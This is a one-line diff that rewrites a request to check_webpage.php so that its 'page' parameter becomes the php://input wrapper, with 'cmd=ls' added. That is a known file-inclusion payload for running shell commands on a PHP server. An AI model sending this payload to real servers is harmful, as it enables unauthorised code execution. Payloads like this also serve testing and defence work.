@@ -1,1 +1,1 @@
-check_webpage.php?page=$WEBROOT
+check_webpage.php?page=php://input&cmd=ls
